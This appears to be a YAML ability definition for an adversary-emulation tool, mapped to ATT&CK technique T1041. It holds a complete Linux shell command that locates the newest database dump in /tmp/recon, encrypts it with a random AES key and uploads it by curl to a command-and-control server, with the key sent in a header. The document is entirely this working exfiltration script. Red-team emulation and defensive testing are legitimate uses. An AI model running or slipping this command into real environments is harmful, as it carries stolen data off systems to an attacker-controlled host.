- id: "exfil-c2-channel"
  name: "Exfiltrate Data via C2"
  description: "Exfiltrates collected data back to the C2 server over encrypted channel."
  tactic: "exfiltration"
  technique:
    attack_id: "T1041"
    name: "Exfiltration Over C2 Channel"
  platforms:
    linux:
      sh:
        command: |
          OUTDIR="/tmp/recon"; C2_SERVER="#{server}"; \
          DUMP=$(ls -t "$OUTDIR"/db_dump_*.tar.gz 2>/dev/null | head -1); \
          if [ -z "$DUMP" ]; then echo "[-] No data to exfiltrate"; exit 1; fi; \
          EXFIL_KEY=$(openssl rand -hex 16); \
          openssl enc -aes-256-cbc -pbkdf2 -pass "pass:$EXFIL_KEY" -in "$DUMP" -out "$DUMP.exfil" 2>/dev/null; \
          echo "[*] Exfiltrating $(du -h "$DUMP.exfil" | cut -f1) to C2..."; \
          curl -s -X POST "$C2_SERVER/file/upload" -F "file=@$DUMP.exfil" -H "X-Key: $EXFIL_KEY" || true; \
          echo "[+] Exfiltration complete. Key: $EXFIL_KEY"